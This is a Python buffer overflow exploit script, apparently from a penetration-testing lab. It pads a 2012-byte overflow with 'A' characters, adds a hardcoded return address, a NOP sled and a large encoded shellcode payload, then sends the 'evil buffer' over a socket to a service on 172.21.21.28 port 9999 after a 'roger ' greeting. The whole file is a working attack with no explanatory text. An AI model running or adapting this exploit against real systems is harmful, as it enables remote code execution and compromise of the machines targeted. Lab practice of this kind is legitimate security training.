import socket

ip = "172.21.21.28"
port = 9999
prefix = ""
offset = 2012 
overflow = "A" * offset
retn = "\xdf\x14\x50\x62"
padding = "\x90" * 16
postfix = ""

buf =  b""
buf += b"\xdb\xd6\xbb\x0c\x20\xa3\x25\xd9\x74\x24\xf4\x5a\x33"
buf += b"\xc9\xb1\x52\x31\x5a\x17\x83\xc2\x04\x03\x56\x33\x41"
buf += b"\xd0\x9a\xdb\x07\x1b\x62\x1c\x68\x95\x87\x2d\xa8\xc1"
buf += b"\xcc\x1e\x18\x81\x80\x92\xd3\xc7\x30\x20\x91\xcf\x37"
buf += b"\x81\x1c\x36\x76\x12\x0c\x0a\x19\x90\x4f\x5f\xf9\xa9"
buf += b"\x9f\x92\xf8\xee\xc2\x5f\xa8\xa7\x89\xf2\x5c\xc3\xc4"
buf += b"\xce\xd7\x9f\xc9\x56\x04\x57\xeb\x77\x9b\xe3\xb2\x57"
buf += b"\x1a\x27\xcf\xd1\x04\x24\xea\xa8\xbf\x9e\x80\x2a\x69"
buf += b"\xef\x69\x80\x54\xdf\x9b\xd8\x91\xd8\x43\xaf\xeb\x1a"
buf += b"\xf9\xa8\x28\x60\x25\x3c\xaa\xc2\xae\xe6\x16\xf2\x63"
buf += b"\x70\xdd\xf8\xc8\xf6\xb9\x1c\xce\xdb\xb2\x19\x5b\xda"
buf += b"\x14\xa8\x1f\xf9\xb0\xf0\xc4\x60\xe1\x5c\xaa\x9d\xf1"
buf += b"\x3e\x13\x38\x7a\xd2\x40\x31\x21\xbb\xa5\x78\xd9\x3b"
buf += b"\xa2\x0b\xaa\x09\x6d\xa0\x24\x22\xe6\x6e\xb3\x45\xdd"
buf += b"\xd7\x2b\xb8\xde\x27\x62\x7f\x8a\x77\x1c\x56\xb3\x13"
buf += b"\xdc\x57\x66\xb3\x8c\xf7\xd9\x74\x7c\xb8\x89\x1c\x96"
buf += b"\x37\xf5\x3d\x99\x9d\x9e\xd4\x60\x76\x0d\x3d\x7f\x90"
buf += b"\x25\x3c\x7f\x8d\xe9\xc9\x99\xc7\x01\x9c\x32\x70\xbb"
buf += b"\x85\xc8\xe1\x44\x10\xb5\x22\xce\x97\x4a\xec\x27\xdd"
buf += b"\x58\x99\xc7\xa8\x02\x0c\xd7\x06\x2a\xd2\x4a\xcd\xaa"
buf += b"\x9d\x76\x5a\xfd\xca\x49\x93\x6b\xe7\xf0\x0d\x89\xfa"
buf += b"\x65\x75\x09\x21\x56\x78\x90\xa4\xe2\x5e\x82\x70\xea"
buf += b"\xda\xf6\x2c\xbd\xb4\xa0\x8a\x17\x77\x1a\x45\xcb\xd1"
buf += b"\xca\x10\x27\xe2\x8c\x1c\x62\x94\x70\xac\xdb\xe1\x8f"
buf += b"\x01\x8c\xe5\xe8\x7f\x2c\x09\x23\xc4\x4c\xe8\xe1\x31"
buf += b"\xe5\xb5\x60\xf8\x68\x46\x5f\x3f\x95\xc5\x55\xc0\x62"
buf += b"\xd5\x1c\xc5\x2f\x51\xcd\xb7\x20\x34\xf1\x64\x40\x1d"


payload = buf

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send("roger ")
    s.recv(1024)
    s.send(buffer)
    print("Done!")
except:
    print("Could not connect.")
